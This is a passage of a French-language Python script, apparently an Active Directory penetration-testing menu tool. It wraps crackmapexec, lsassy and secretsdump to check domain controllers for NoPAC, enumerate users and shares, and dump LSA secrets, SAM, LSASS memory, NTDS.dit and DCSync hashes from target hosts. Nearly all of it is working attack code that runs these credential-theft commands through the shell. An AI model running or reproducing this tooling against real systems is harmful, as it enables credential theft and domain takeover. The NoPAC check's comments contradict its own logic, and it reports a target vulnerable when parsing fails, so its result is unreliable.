          {bcolors.ENDC}
""")
    #le fichier binaire de l'outil que nous voulons utiliser
    crackmap_path=shutil.which("crackmapexec")
    if crackmap_path is None:
        print(f"""{bcolors.ROUGE}[-] l'outil crackmapexec non trouvé.\nInstaller avec la commande :
'sudo apt install crackmapexec' {bcolors.ENDC}""")
        return ""
    print(f"""{bcolors.VERT}[+] l'outil crackmapexec trouvé \n {bcolors.ENDC}""")
    command= "sudo " +crackmap_path+" smb <l'adresse IP du controleur de domaine> -u \"<nom d'utilisateur>\" -p \"<mot de passe>\" -M nopac"

    ip_address=input("Entrez l'adresse IP du controleur de domaine  (ex:192.168.25.10): ")
    command=command.replace("<l'adresse IP du controleur de domaine>",ip_address)  
        
    user_name=input("Entrez le nom d'utilisateur d'un compte dans le domaine (ex:User1 ou User2 ou Administrator): ")
    command=command.replace("<nom d'utilisateur>",user_name)

    password=input("Entrez le mot de passe de ce compte (ex:P@ssword1): ")
    command=command.replace("<mot de passe>",password) 
    print("Rechercher la vulnérabilité .........")

    # Démarrer le processus netexec/crackmapexec en arrière-plan
    #Attendre que la commande se termine et récupérer sa sortie.
    output=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
    outputt,erreur=output.communicate()
    lines = outputt.split('\n')
    print("\n")
    print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")


    vulnerable = False

    #Divisez la sortie en lignes
    lines = outputt.split('\n')
    tgt_with_pac_size = None
    tgt_without_pac_size = None
    for line in lines:
        if 'TGT with PAC size' in line:
            tgt_with_pac_size = int(line.split()[-1])
        elif 'TGT without PAC size' in line:
            tgt_without_pac_size = int(line.split()[-1])

    if tgt_with_pac_size == tgt_without_pac_size and tgt_with_pac_size > 1000:
        vulnerable=False  # le controleur de domaine est vulnérable à NoPAC
    else:
        vulnerable=True  # le controleur de domaine n'est pas vulnérable à NoPAC.



    if vulnerable:
        print("le controleur de domaine est vulnérable à NoPAC.")
    else:
        print("le controleur de domaine n'est pas vulnérable à NoPAC.")




    print(f"{bcolors.VERT}\n**************************************************************************************************************************************\n {bcolors.ENDC}")





#****************************************************************************************************
#********* => 4-Enumération de l'active directory
#****************************************************************************************************


def enumeration_ad():
    menu_option_5 = {
        1: "Option (1) : Lister les utilisateurs",
        2: "Option (2) : Lister les utilisateurs connectés",
        3: "Option (3) : Lister les ordinateurs",
        4: "Option (4) : Lister les groupes",
        5: "Option (5) : Lister les stratégies du mot de passe",
        6: "Option (6) : Lister les sessions",
        7: "Option (7) : Lister les dossiers partagés",
        8: "Option (8) : Retourner au menu principal",
        9: "Option (9) : Quitter l'outil"
    }
    print(f'''{bcolors.VERT}**************************************************************************************************************************************\n \
Option 4 : Enumération de l'Active Directory
    Cette option permet d'énumérer ou de faire la reconnaissance des objets \nde l'Active Directory tels que les utilisateurs, les ordinateurs, etc.
**************************************************************************************************************************************{bcolors.ENDC}''')
    while True:
        option = print_menu(menu_option_5)
        if option == 1:
            enumeration_ad_sous(" --users")
        elif option == 2:
            enumeration_ad_sous(" --loggedon-users")
        elif option == 3:
            enumeration_ad_sous(" --computers")
        elif option == 4:
            enumeration_ad_sous(" --groups")
        elif option == 5:
            enumeration_ad_sous(" --pass-pol")
        elif option == 6:
            enumeration_ad_sous(" --sessions")
        elif option == 7:
            enumeration_ad_sous(" --shares")
        elif option == 8:
            print("Retourner au menu principal") 
            break
        elif option ==9:
            print(f"\n{bcolors.VERT}Sortie de l'outil de Pentest de l'active directory BYEBYE{bcolors.ENDC}")            
            global con_break
            con_break=True
            break

def enumeration_ad_sous(option):
    cmd_opt=option
    #le fichier binaire de l'outil que nous voulons utiliser
    crackmap_path=shutil.which("crackmapexec")

    if crackmap_path is not None:
        print(f"""{bcolors.VERT}[+] l'outil crackmapexec trouvé \n       
{bcolors.WARNING}commande: sudo {crackmap_path} smb <ip du controleur de domaine> -u <nom d'utilisateur> -p <mot de passe> {cmd_opt}{bcolors.ENDC}""")
        command="sudo "+ crackmap_path+" smb <ip du controleur de domaine> -u <nom d'utilisateur> -p <mot de passe> "+cmd_opt

        ip_address=input("Entrez l'adresse ip du controleur de domaine (ex:192.168.25.10): ")
        command=command.replace("<ip du controleur de domaine>",ip_address)

        user_name=input("Entrez le nom d'utilisateur (ex:User1 ou User2 ou Administrator): ")
        command=command.replace("<nom d'utilisateur>",user_name)

        password=input("Entrez le mot de passe que vous souhaitez utiliser (ex:P@ssword1): ")
        command=command.replace("<mot de passe>",password)   

        print("\n")
        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")
    #Exécuter la commande
        subprocess.run(command, shell=True)
        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")

    else:
        print(f"""{bcolors.ROUGE}[-] l'outil crackmapexec non trouvé.\nInstaller avec la commande :
'sudo apt install crackmapexec' {bcolors.ENDC}""")

#****************************************************************************************************
#********* => 5-Extraction des identifiants (Credentials Dump)
#****************************************************************************************************
def dump_ad():
    menu_option_6 = {
    1: "Option (1): Extraire des secrets LSA",
    2: "Option (2): Extraire des identifiants SAM",
    3: "Option (3): Extraire de secrets LSASS",
	4: "Option (4): Extraire du NTDS.dit",
	5: "Option (5): Extraire avec DCSync",
    6: "Option (6): Retourner au menu principal",
    7: "Option (7): Quitter l'outil"
                    }

    print(f'''{bcolors.VERT}**************************************************************************************************************************************\n \
Option 5 : Extraction des identifiants (Credentials Dump)
    Cette option permet d'extraire des identifiants tels que les noms d'utilisateur et leurs mots de passe 
    hashés, ainsi que d'autres données, à partir de plusieurs ressources.
**************************************************************************************************************************************{bcolors.ENDC}''')
    while True:
        option = print_menu(menu_option_6)
        if option == 1:
            lsa_dump()
        elif option == 2:
            sam_dump()
        elif option == 3:
            lsass_dump()
        elif option == 4:
            ntds_dump()
        elif option == 5:
            dcsync_dump()
        elif option == 6:
            print("Retourner au menu principal") 
            break
        elif option ==7:
            print(f"\n{bcolors.VERT}Sortie de l'outil de Pentest de l'active directory BYEBYE{bcolors.ENDC}")            
            global con_break
            con_break=True
            break

def lsa_dump():
    print(f"""{bcolors.WARNING} Description d'Extraire des secrets LSA (Dump LSA): 
    Les secrets LSA (Local Security Authority) sont des données sensibles stockées localement sur un système Windows. 
Extraire ces secrets peut révéler des informations d'identification ou d'autres données sensibles. 
Pour ce faire, on peut utiliser des outils tels que 'crackmapexec', ainsi que d'autres comme 'secretsdump', 'nxc', etc. 
Dans notre cas, l'outil utilisé est 'crackmapexec'. 
    {bcolors.ENDC}""")
    #le fichier binaire de l'outil que nous voulons utiliser
    crackmap_path=shutil.which("crackmapexec")

    if crackmap_path is not None:
        print(f"""{bcolors.VERT}[+] l'outil crackmapexec trouvé \n       
{bcolors.WARNING}commande: sudo{crackmap_path} smb <machine cible ip> -u <nom d'utilisateur> -p <mot de passe> --lsa{bcolors.ENDC}""")
        command="sudo "+ crackmap_path+" smb <machine cible ip> -u <nom d'utilisateur> -p <mot de passe> --lsa "

        ip_address=input("Entrez l'adresse ip du machine cible (ex:192.168.25.20): ")
        command=command.replace("<machine cible ip>",ip_address)

        user_name=input("Entrez le nom d'utilisateur (ex:User1 ou User2): ")
        command=command.replace("<nom d'utilisateur>",user_name)

        password=input("Entrez le mot de passe que vous souhaitez utiliser (ex:P@ssword1): ")
        command=command.replace("<mot de passe>",password)   

        print("\n")
        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")
        #Exécuter la commande       
        subprocess.run(command, shell=True)
        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")

    else:
        print(f"""{bcolors.ROUGE}[-] l'outil crackmapexec non trouvé.\nInstaller avec la commande :
'sudo apt install crackmapexec' {bcolors.ENDC}""")

def sam_dump():
    print(f"""{bcolors.WARNING} Description d'Extraire des identifiants SAM: 
    SAM (Security Account Manager) est une base de données locale sur les systèmes Windows qui stocke les informations d'identification des utilisateurs. 
Extraire des identifiants SAM peut permettre d'accéder aux comptes utilisateur locaux. 
Pour ce faire, on peut utiliser des outils tels que 'crackmapexec', ainsi que d'autres comme 'secretsdump', 'nxc', etc. 
Dans notre cas, l'outil utilisé est 'crackmapexec'. 
    {bcolors.ENDC}""")
    #le fichier binaire de l'outil que nous voulons utiliser
    crackmap_path=shutil.which("crackmapexec")

    if crackmap_path is not None:
        print(f"""{bcolors.VERT}[+] l'outil crackmapexec trouvé \n
{bcolors.WARNING}commande: sudo{crackmap_path} smb <machine cible ip> -u <nom d'utilisateur> -p <mot de passe> --sam{bcolors.ENDC}""")
        command="sudo "+ crackmap_path+" smb <machine cible ip> -u \"<nom d'utilisateur>\" -p \"<mot de passe>\" --sam"

        ip_address=input("Entrez l'adresse ip du machine cible (ex:192.168.25.20): ")
        command=command.replace("<machine cible ip>",ip_address)

        user_name=input("Entrez le nom d'utilisateur (ex:User1 ou User2): ")
        command=command.replace("<nom d'utilisateur>",user_name)

        password=input("Entrez le mot de passe que vous souhaitez utiliser (ex:P@ssword1): ")
        command=command.replace("<mot de passe>",password)   

        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")
        #Exécuter la commande
        subprocess.run(command, shell=True)
        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")

    else:
        print(f"""{bcolors.ROUGE}[-] l'outil crackmapexec non trouvé.\nInstaller avec la commande :
'sudo apt install crackmapexec' {bcolors.ENDC}""")    


def lsass_dump():
    print(f"""{bcolors.WARNING} Description d'Extraire de secrets LSASS: 
    L'extraction de secrets LSASS (Local Security Authority Subsystem Service) est une technique utilisée 
pour récupérer des informations sensibles à partir du processus LSASS sur un système Windows. 
LSASS joue un rôle crucial dans l'authentification des utilisateurs sur le système et contient des informations 
telles que les informations d'identification en texte clair, des hash de mot de passe, des jetons 
d'authentification et d'autres données liées à la sécurité du système.. 
Pour ce faire, on peut utiliser des outils tels que 'crackmapexec', ainsi que d'autres comme 'lsassy', etc. 
Dans notre cas, l'outil utilisé est 'lsassy'. 
    {bcolors.ENDC}""")
    #le fichier binaire de l'outil que nous voulons utiliser
    lsassy_path=shutil.which("lsassy")

    if lsassy_path is not None:
        print(f"""{bcolors.VERT}[+] l'outil lsassy trouvé \n
{bcolors.WARNING}commande: sudo {lsassy_path} -d <domaine> -u <nom d'utilisateur> -p <mot de passe> <machine cible ip>{bcolors.ENDC}""")
        command="sudo "+ lsassy_path+" -d <domaine> -u <nom d'utilisateur> -p <mot de passe> <machine cible ip>"

        domaine_name=input("Entrez le nom de domaine racine (ex:seghrouchni.com): ")
        command=command.replace("<domaine>",domaine_name)

        user_name=input("Entrez le nom d'utilisateur (ex:User1 ou User2): ")
        command=command.replace("<nom d'utilisateur>",user_name)

        password=input("Entrez le mot de passe que vous souhaitez utiliser (ex:P@ssword1): ")
        command=command.replace("<mot de passe>",password)   

        ip_address=input("Entrez l'adresse ip du machine cible (ex:192.168.25.20): ")
        command=command.replace("<machine cible ip>",ip_address)
        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")
        #Exécuter la commande
        subprocess.run(command, shell=True)
        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")

    else:
        print(f"""{bcolors.ROUGE}[-] l'outil lsassy non trouvé.\nInstaller avec les commandes suivants :
1-'python3 -m pip install lsassy'\n 2-'python3 setup.py install' {bcolors.ENDC}""")  


def ntds_dump():
    print(f"""{bcolors.WARNING} Description d'Extraire du NTDS.dit: 
    Extraire du NTDS.dit fait référence à la récupération des informations stockées dans la base de données 
Active Directory sur les contrôleurs de domaine Windows. NTDS.dit est le fichier de base de données principale où sont stockées 
les informations d'identification des utilisateurs, les informations sur les groupes, les stratégies de groupe et d'autres données relatives à l'annuaire. 
{bcolors.ROUGE}Cependant, il est important de noter que l'accès à NTDS.dit nécessite des privilèges élevés sur le système
    {bcolors.ENDC}""")
    #le fichier binaire de l'outil que nous voulons utiliser
    crackmap_path=shutil.which("crackmapexec")

    if crackmap_path is not None:
        print(f"""{bcolors.VERT}[+] l'outil crackmapexec trouvé \n
{bcolors.WARNING}commande: sudo{crackmap_path} smb <ip du controleur de domaine> -u <nom d'utilisateur privilégié> -p <mot de passe> --ntds{bcolors.ENDC}""")
        command="sudo "+ crackmap_path+" smb <ip du controleur de domaine> -u <nom d'utilisateur privilégié> -p \"<mot de passe>\" --ntds"

        ip_address=input("Entrez l'adresse ip du controleur de domaine (ex:192.168.25.10): ")
        command=command.replace("<ip du controleur de domaine>",ip_address)

        user_name=input("Entrez le nom d'utilisateur privilégié (ex:Administrator ou SQLService): ")
        command=command.replace("<nom d'utilisateur privilégié>",user_name)

        password=input("Entrez le mot de passe que vous souhaitez utiliser (ex:P@$$w0rd): ")
        password=password.replace("$","\$")
        command=command.replace("<mot de passe>",password)   
        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")
        #Exécuter la commande
        subprocess.run(command, shell=True)
        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")

    else:
        print(f"""{bcolors.ROUGE}[-] l'outil crackmapexec non trouvé.\nInstaller avec la commande :
'sudo apt install crackmapexec' {bcolors.ENDC}""")  


def dcsync_dump():
    print(f"""{bcolors.WARNING} Description d'Extraire avec DCSync: 
    DCSync est une technique utilisée pour récupérer des informations d'identification à partir des contrôleurs de domaine Windows. 
Elle permet à un attaquant d'imiter un contrôleur de domaine et de récupérer les informations d'identification de tous les utilisateurs du domaine. 
Contrairement à une simple copie et analyse du fichier NTDS.dit, DCSync utilise l'infrastructure de réplication d'Active Directory 
pour extraire des informations sensibles, plutôt que de simplement copier un fichier.
    {bcolors.ENDC}""")
    #Liste des fichiers binaires de l'outil que nous voulons utiliser
    #Nous utilisons 'which' pour vérifier si un outil est disponible, et si oui, nous arrêtons la recherche.
    secrets_bins=["impacket-secretsdump","secretsdump.py"]
    for bin in secrets_bins:
        secrets_path=shutil.which(bin)
        if secrets_path is not None:
            break

    if secrets_path is not None:
        print(f"""{bcolors.VERT}[+] l'outil secretsdump trouvé \n
{bcolors.WARNING}commande: sudo{secrets_path} -just-dc <domaine>/<nom d'utilisateur privilégié>:<mot de passe>@<ip du controleur de domaine> {bcolors.ENDC}""")
        command="sudo "+ secrets_path+" -just-dc <domaine>/<nom d'utilisateur privilégié>:\"<mot de passe>\"@<ip du controleur de domaine> "
        domaine_name=input("Entrez le nom de domaine racine (ex:seghrouchni.com): ")
        command=command.replace("<domaine>",domaine_name)
        user_name=input("Entrez le nom d'utilisateur privilégié (ex:Administrator ou SQLService): ")
        command=command.replace("<nom d'utilisateur privilégié>",user_name)
        password=input("Entrez le mot de passe que vous souhaitez utiliser (ex:P@$$w0rd): ")
        password=password.replace("$","\$")
        command=command.replace("<mot de passe>",password) 
        ip_address=input("Entrez l'adresse ip du controleur de domaine (ex:192.168.25.10): ")
        command=command.replace("<ip du controleur de domaine>",ip_address)

          
        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")
        #Exécuter la commande
        subprocess.run(command, shell=True)
        print(f"{bcolors.VERT}**************************************************************************************************************************************\n {bcolors.ENDC}")

    else:
        print(f"""{bcolors.ROUGE}[-] l'outil secretsdump non trouvé.\nInstaller avec la commande :
'sudo apt install python3-impacket ' {bcolors.ENDC}""") 

##***************************************************************************************************
##********* => MAIN MENU
##***************************************************************************************************
print(f""" **************************************************************************************************************************************{bcolors.FSOTITRE}   
                                        
    ███████╗███████╗ ██████╗ {bcolors.VERT} ██╗  ██╗{bcolors.ROUGE} ██████╗  █████╗ ████████╗ █████╗ {bcolors.ENDC}██████╗ ██████╗  ██████╗ ████████╗███████╗ ██████╗████████╗{bcolors.FSOTITRE} 
    ██╔════╝██╔════╝██╔═══██╗ {bcolors.VERT}╚██╗██╔╝{bcolors.ROUGE} ██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗{bcolors.ENDC}██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝{bcolors.FSOTITRE}     
    █████╗  ███████╗██║   ██║ {bcolors.VERT} ╚███╔╝ {bcolors.ROUGE} ██║  ██║███████║   ██║   ███████║{bcolors.ENDC}██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██║        ██║   {bcolors.FSOTITRE} 
    ██╔══╝  ╚════██║██║   ██║ {bcolors.VERT} ██╔██╗ {bcolors.ROUGE} ██║  ██║██╔══██║   ██║   ██╔══██║{bcolors.ENDC}██╔═══╝ ██╔══██╗██║   ██║   ██║   ██╔══╝  ██║        ██║   {bcolors.FSOTITRE} 
    ██║     ███████║╚██████╔╝ {bcolors.VERT}██╔╝ ██╗ {bcolors.ROUGE}██████╔╝██║  ██║   ██║   ██║  ██║{bcolors.ENDC}██║     ██║  ██║╚██████╔╝   ██║   ███████╗╚██████╗   ██║   {bcolors.FSOTITRE} 
    ╚═╝     ╚══════╝ ╚═════╝ {bcolors.VERT} ╚═╝  ╚═╝ {bcolors.ROUGE}╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝{bcolors.ENDC}╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝ ╚═════╝   ╚═╝    

             _   _                 _ _               _                                      _            _     _              _         _   ___  
   __ _  ___| |_(_)_   _____    __| (_)_ __ ___  ___| |_ ___  _ __ _   _   _ __   ___ _ __ | |_ ___  ___| |_  | |_ ___   ___ | | __   _/ | / _ \ 
  / _` |/ __| __| \ \ / / _ \  / _` | | '__/ _ \/ __| __/ _ \| '__| | | | | '_ \ / _ \ '_ \| __/ _ \/ __| __| | __/ _ \ / _ \| | \ \ / / || | | |
 | (_| | (__| |_| |\ V /  __/ | (_| | | | |  __/ (__| || (_) | |  | |_| | | |_) |  __/ | | | ||  __/\__ \ |_  | || (_) | (_) | |  \ V /| || |_| |
  \__,_|\___|\__|_| \_/ \___|  \__,_|_|_|  \___|\___|\__\___/|_|   \__, | | .__/ \___|_| |_|\__\___||___/\__|  \__\___/ \___/|_|   \_/ |_(_)___/ 
                                                                   |___/  |_|                                                                    
    by {bcolors.BLEU}Ayoub SEGHROUCHNI{bcolors.ENDC}
**************************************************************************************************************************************""")


main_menu_options = {
    1: "Option (1): Scanner le réseau",
    2: "Option (2): Exploiter des attaques classiques",
    3: "Option (3): Recherche et exploitation de vulnérabilités connues",
	4: "Option (4): Enumération de l'active directory",
    5: "Option (5): Extraction des identifiants (Credentials Dump)",
    6: "Option (6): Quitter",
}

if __name__=='__main__':
    while True and con_break ==False:
        option = print_menu(main_menu_options)
        if option == 1:
            scanning_network() #Scanner le réseau
        elif option == 2:
            attaques_classiques() #Exploiter des attaques classiques tel que kerberoasting, AS-rep, password spraying etc..
        elif option == 3:
            rech_exp_vuln() #Rechercher ou Exploiter des vulnérabilités connues tel que smb signing , eternalBlue .....
        elif option == 4:
            enumeration_ad() #Énumérer l'AD en découvrant la liste des utilisateurs, des ordinateurs, des stratégies de mots de passe, etc.
        elif option == 5:
            dump_ad() #Extraire des identifiants de l'AD 
        elif option == 6:
            print(f"\n{bcolors.VERT}Sortie de l'outil de Pentest de l'active directory BYEBYE{bcolors.ENDC}")
            break
